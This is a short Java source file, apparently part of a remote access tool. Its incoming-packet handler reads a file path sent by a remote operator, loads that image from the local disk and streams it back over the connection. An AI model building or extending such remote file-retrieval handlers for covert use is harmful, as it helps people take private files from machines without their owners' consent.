package com.redpois0n.packets.incoming;

import java.awt.image.BufferedImage;
import java.io.File;

import javax.imageio.ImageIO;

import com.redpois0n.Connection;
import com.redpois0n.packets.outgoing.Header;
import com.redpois0n.utils.ImageUtils;


public class PacketIMGP extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String file = Connection.readLine();
	
		Connection.addToSendQueue(new PacketBuilder(Header.IMAGE_PREVIEW));
		
		BufferedImage screenShot = ImageIO.read(new File(file));
		byte[] buffer = ImageUtils.encodeImage(screenShot, 1F);
		Connection.writeInt(buffer.length);
		Connection.writeInt(screenShot.getWidth());
		Connection.writeInt(screenShot.getHeight());
		Connection.dos.write(buffer);
		
	}

}
